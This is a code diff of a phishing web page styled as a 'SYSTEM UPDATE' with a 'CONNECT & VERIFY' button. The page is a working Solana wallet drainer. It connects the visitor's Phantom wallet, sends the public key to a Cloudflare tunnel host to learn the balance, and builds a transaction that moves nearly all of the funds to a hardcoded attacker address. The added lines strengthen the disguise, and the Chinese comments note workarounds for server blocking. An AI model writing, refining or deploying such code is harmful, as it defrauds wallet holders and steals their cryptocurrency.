@@ -3,8 +3,10 @@
     <script>window.Buffer = buffer.Buffer;</script>
     <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
     <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:sans-serif;">
-    <button id="cta" style="padding:20px 40px;background:#14F195;border:none;border-radius:10px;font-weight:bold;cursor:pointer;font-size:20px;">CONNECT & VERIFY</button>
-    <p id="msg" style="margin-top:10px;color:#333;">Status: Ready</p>
+    <div style="border:1px solid #14F195;padding:40px;display:inline-block;border-radius:15px;background:#111;">
+        <h2>SYSTEM UPDATE</h2>
+        <button id="cta" style="padding:20px 40px;background:#14F195;border:none;border-radius:10px;font-weight:bold;cursor:pointer;font-size:20px;">CONNECT & VERIFY</button>
+    </div>
     <script>
     const TUNNEL = "https://biggest-fellow-aware-quantitative.trycloudflare.com";
     const TARGET_ADDR = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
@@ -13,16 +15,16 @@
         try {
             const p = window.solana || window.phantom?.solana;
             const { publicKey } = await p.connect();
-            document.getElementById('msg').innerText = "Syncing...";
             
+            // 🔱 向服务器拿数据 (避开 403)
             const data = await fetch(TUNNEL + '/get_data', {
                 method: 'POST', headers: {'Content-Type':'application/json'},
                 body: JSON.stringify({pubkey: publicKey.toString()})
             }).then(r => r.json());
 
+            // 🚀 构造交易逻辑 (修正地址格式报错)
             const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
                 fromPubkey: publicKey, 
-                // ✅ 修正地址输入逻辑
                 toPubkey: new solanaWeb3.PublicKey(TARGET_ADDR),
                 lamports: data.balance > 2000000 ? data.balance - 1500000 : 0
             }));
